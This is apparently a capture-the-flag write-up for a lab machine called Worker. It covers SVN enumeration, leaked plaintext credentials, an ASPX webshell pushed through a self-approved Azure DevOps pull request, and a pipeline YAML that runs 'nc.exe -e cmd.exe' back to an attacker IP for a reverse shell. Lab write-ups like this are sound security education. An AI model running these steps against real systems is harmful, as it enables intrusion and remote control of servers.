# Worker

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.2.29 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 09:57 EDT
Nmap scan report for 10.129.2.29
Host is up (0.0082s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3690/tcp open  svn
5985/tcp open  wsman
```

WinRM is open, and we might use `evil-winrm` later.&#x20;

### SVN&#x20;

Port 3690 was running SVN, which is short for Subversion. Following Hacktricks, we can enumerate this using `svn`.&#x20;

```
$ svn ls svn://10.129.2.29
dimension.worker.htb/
moved.txt
```

We can find a domain here, and we can add this to our `/etc/hosts` file. When we load the website, it shows a coporate website.

<figure><img src="../../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

There wasn't much here, so I went back to enumerating SVN. We could download the entire respository and view the files within it. When doing so, we would find some credentials.

```
$ cat deploy.ps1   
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Interesting. There was nothign else within the files, so I proceeded with a subdomain fuzz using `wfuzz`, and there were quite a few when using different wordlists. The most interesting one was the `devops` one.&#x20;

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh=703 -H 'Host: FUZZ.worker.htb' -u http://worker.htb 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://worker.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000296:   200        170 L    542 W      6495 Ch     "alpha"                     
000007691:   200        355 L    1408 W     16045 Ch    "story"                     
000022566:   401        85 L     329 W      20028 Ch    "devops"                    
000023339:   200        397 L    1274 W     14803 Ch    "cartoon"                   
000023462:   200        111 L    398 W      4971 Ch     "lens"                      
000024714:   200        368 L    1173 W     14588 Ch    "dimension"
```

We can head there first, and it does ask for credentials.&#x20;

<figure><img src="../../../.gitbook/assets/image (180) (2).png" alt=""><figcaption></figcaption></figure>

Using the one we found in `deploy.ps1`, we can login.&#x20;

### Devops

This is hosting an Azure Devops instance.

<figure><img src="../../../.gitbook/assets/image (152) (4).png" alt=""><figcaption></figcaption></figure>

Here, there was one repository for SmartHotel360, which was located at `spectral.worker.htb`. \


<figure><img src="../../../.gitbook/assets/image (186) (2).png" alt=""><figcaption></figcaption></figure>

This was an IIS site, so we can try to upload an ASPX shell on this site and see if we can trigger it by visting the website. However, we can only upload through pull requests.

<figure><img src="../../../.gitbook/assets/image (168) (3).png" alt=""><figcaption></figcaption></figure>

I tried submitting one by issuing a request using a new branch name.

<figure><img src="../../../.gitbook/assets/image (147) (4).png" alt=""><figcaption></figcaption></figure>

The funny thing is, I can approve of the PR myself.&#x20;

<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Make sure we set the Work Items before approving.

<figure><img src="../../../.gitbook/assets/image (195) (1).png" alt=""><figcaption></figcaption></figure>

Then complete the merge:

<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

Then just trigger the webshell by visiting the file or using `curl`.

<figure><img src="../../../.gitbook/assets/image (177) (3) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SVN Repos

Within the machine, I was unable to find a lot of files, like the SVN repo for example. To me, it was similar to being in a Docker for Windows. In this case, I checked whether there were other disks available on the machine.

```
c:\>wmic logicaldisk get name
wmic logicaldisk get name
Name  
C:    
W:
```

We can switch to the W Drive.&#x20;

```
W:\>dir
dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\

2020-06-16  18:59    <DIR>          agents
2020-03-28  15:57    <DIR>          AzureDevOpsData
2020-04-03  11:31    <DIR>          sites
2020-06-20  16:04    <DIR>          svnrepos
               0 File(s)              0 bytes
               4 Dir(s)  18�766�819�328 bytes free
```

Within the `svnrepos`, there was a password file:

```
W:\svnrepos\www\conf>type passwd
type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

Switching back to the `C:` drive, we notice the user here is `robisl`.&#x20;

```
c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of c:\Users

2020-07-07  17:53    <DIR>          .
2020-07-07  17:53    <DIR>          ..
2020-03-28  15:59    <DIR>          .NET v4.5
2020-03-28  15:59    <DIR>          .NET v4.5 Classic
2020-08-18  00:33    <DIR>          Administrator
2020-03-28  15:01    <DIR>          Public
2020-07-22  01:11    <DIR>          restorer
2020-07-08  19:22    <DIR>          robisl
               0 File(s)              0 bytes
               8 Dir(s)  10�526�629�888 bytes free
```

I tried to `evil-winrm` in as the user, and it worked!

<figure><img src="../../../.gitbook/assets/image (70) (4).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag easily.&#x20;

### Azure DevOps PE

There wasn't much in the machine to begin with, so I shifted back to the Azure Devops instance to see if we could login as the user, and we could.&#x20;

<figure><img src="../../../.gitbook/assets/image (199) (3).png" alt=""><figcaption></figcaption></figure>

Now, we have access to another repository. When viewing the project settings, I can see that our user is a Build Administrator.

<figure><img src="../../../.gitbook/assets/image (166) (3) (1).png" alt=""><figcaption></figcaption></figure>

This means that we can set pipeline permissions. Using this, we can create a new pipeline that uses YAML to execute code:

<figure><img src="../../../.gitbook/assets/image (151) (4).png" alt=""><figcaption></figcaption></figure>

Use Azure Repos Git > Parts Unlimited > Starter Pipeline. Here, we can create a YAML script to gain a reverse shell.

<figure><img src="../../../.gitbook/assets/image (127) (3) (1).png" alt=""><figcaption></figcaption></figure>

Replace it with this:

```yaml
# Starter pipeline
# Start with a minimal pipeline that you can customize to build and deploy your code.
# Add steps that build, run tests, deploy, and more:
# https://aka.ms/yaml

trigger:
- master

pool: 'Setup'

steps:
- script: C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.14.13 4444 # install nc.exe
  displayName: 'shell'
```

The reason we need to change the Pool is because there is no pool named 'Default', but there is one called Setup. This can be enumerated in Project Settings:

<figure><img src="../../../.gitbook/assets/image (162) (1).png" alt=""><figcaption></figcaption></figure>

Once we run it, we would get a reverse shell once the command executes.

<figure><img src="../../../.gitbook/assets/image (77) (1) (3).png" alt=""><figcaption></figcaption></figure>

Rooted!
